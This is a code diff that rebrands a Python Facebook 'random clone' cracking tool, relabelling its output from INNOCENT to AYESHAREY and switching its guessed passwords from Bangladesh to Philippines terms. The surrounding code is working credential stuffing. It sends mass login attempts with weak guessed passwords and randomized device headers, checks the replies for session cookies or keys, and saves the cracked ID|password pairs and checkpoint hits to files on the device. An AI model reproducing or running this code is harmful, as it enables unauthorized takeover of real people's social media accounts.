@@ -75,10 +75,10 @@ logo = ("""
  ┃ [\033[1;91m✓\033[1;92m] AUTHOR    \033[1;91m: \033[1;92mAYESHA/REYSY               ┃
  ┃ [\033[1;91m✓\033[1;92m] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
  ┃ [\033[1;91m✓\033[1;92m] STATUS    \033[1;91m: \033[1;92mPAID                       ┃
- ┃ [\033[1;91m✓\033[1;92m] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
+ ┃ [\033[1;91m✓\033[1;92m] SYSTEM    \033[1;91m: \033[1;92mDATA                       ┃
  ┃ [\033[1;91m✓\033[1;92m] GITHUB    \033[1;91m: \033[1;92mAYESHAHAKDOG               ┃
  ┃ [\033[1;91m✓\033[1;92m] FACEBOOK  \033[1;91m: \033[1;92mAYESHA                     ┃
- ┃ [\033[1;91m✓\033[1;92m] WHATSAPP  \033[1;91m: \033[1;92m+639197999663              ┃
+ ┃ [\033[1;91m✓\033[1;92m] Version.  \033[1;91m: \033[1;92m0.01                       ┃
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
 
 def linex():
@@ -174,7 +174,7 @@ def Spy():
 					crack_submit.submit(api1,ids,names,passlist)
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [INNOCENT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [AYESHAREY-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -195,15 +195,15 @@ def ffb(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [INNOCENT-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/INNOCENT-XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [AYESHAREY-OK] %s | %s'%(ids,pas))
+                                open(f'/sdcard/AYESHAREY-XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/INNOCENT-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [AYESHAREY-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/AYESHAREY-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -217,7 +217,7 @@ xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","G
 #
 def ffb1(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [INNOCENT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [AYESHAREY-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -238,15 +238,15 @@ def ffb1(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [INNOCENT-OK] %s | %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m [AYESHAREY-OK] %s | %s'%(ids,pas))
                                 #cek_apk(session,coki)
-                                open(f'/sdcard/INNOCENT-XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/AYESHAREY-XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/INNOCENT-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [AYESHAREY-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/AYESHAREY-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -260,7 +260,7 @@ def ffb1(ids,names,passlist):
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [INNOCENT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [AYESHAREY-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(f' ')[0]
                         try:
                                 ln = names.split(f' ')[1]
@@ -310,15 +310,15 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [INNOCENT-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/INNOCENT-XD-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [AYESHAREY-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/AYESHAREY-XD-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/INNOCENT-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [AYESHAREY-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/AYESHAREY-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -331,7 +331,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [INNOCENT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [AYESHAREY-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(f' ')[0]
                         try:
                                 ln = names.split(f' ')[1]
@@ -381,19 +381,19 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [INNOCENT-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print(f'\r\r\033[1;32m [AYESHAREY-OK] '+ids+' | '+pas+'\033[1;97m')
                                         open(f'/sdcard/INNOCENT-XD-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/INNOCENT-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [AYESHAREY-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/AYESHAREY-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open(f'/sdcard/INNOCENT-XD-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open(f'/sdcard/AYESHAREY-XD-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -404,7 +404,7 @@ def api1(ids,names,passlist):
                         pass
 def ffb7(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [INNOCENT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [AYESHAREY-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -425,15 +425,15 @@ def ffb7(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [INNOCENT-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/INNOCENT-XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [AYESHAREY-OK] %s | %s'%(ids,pas))
+                                open(f'/sdcard/AYESHAREY-XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/INNOCENT-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [AYESHAREY-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/AYESHAREY-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -469,7 +469,7 @@ def bd():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'bangladesh','Bangladesh','i love you','iloveyou','free fire','Free Fire']
+                                passlist = [psx,ids,'philippines','Philippines','i love you','iloveyou','free fire','Free Fire']
                                 sat.submit(apix,ids,passlist)
                 print('\033[1;37m')
                 linex()
@@ -523,7 +523,7 @@ def rcrack_free(idf,pwv):
 		for ps in pwv:
 	#		print(idf+'|'+ps)
 			#session = requests.Session()
-			sys.stdout.write(f'\r\r\033[1;37m [INNOCENT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write(f'\r\r\033[1;37m [AYESHREY-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			pro = random.choice(useragent)
 			free_fb = session.get('https://m.alpha.facebook.com').text
@@ -558,7 +558,7 @@ def rcrack_free(idf,pwv):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
 				print('\n')
-				print('\033[1;92m[INNOCENT-OK] '+idf+' | '+ps+'\033[0;97m')
+				print('\033[1;92m[AYESHAREY-OK] '+idf+' | '+ps+'\033[0;97m')
 				cek_apk(coki)
 				open('ok.txt', 'a').write(idf+' | '+ps+'\n')
 				oks.append(idf)
@@ -567,7 +567,7 @@ def rcrack_free(idf,pwv):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				print('\n')
-				print('\033[1;91m[INNOCENT-CP] '+idf+' | '+ps+'\033[0;97m')
+				print('\033[1;91m[AYESHAREY-CP] '+idf+' | '+ps+'\033[0;97m')
 				open('cp.txt', 'a').write(idf+' | '+ps+'\n')
 				cps.append(idf)
 				break
@@ -575,7 +575,7 @@ def rcrack_free(idf,pwv):
 				continue
 		loop+=1
 		bo = random.choice([m,k,h,b,u,x])
-		sys.stdout.write(f'\r\r\033[1;37m [INNOCENT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write(f'\r\r\033[1;37m [AYESHAREY-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		sys.stdout.flush()
 	
 	except:
@@ -583,7 +583,7 @@ def rcrack_free(idf,pwv):
 def apix(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [INNOCENT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [ AYESHAREY-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -628,19 +628,19 @@ def apix(ids,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [INNOCENT-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/INNOCENT-XD-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [AYESHREY-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/AYESHAREY-XD-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/INNOCENT-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [AYESHAREY-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/AYESHAREY-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open(f'/sdcard/INNOCENT-XD-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open(f'/sdcard/AYESHAREY-XD-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
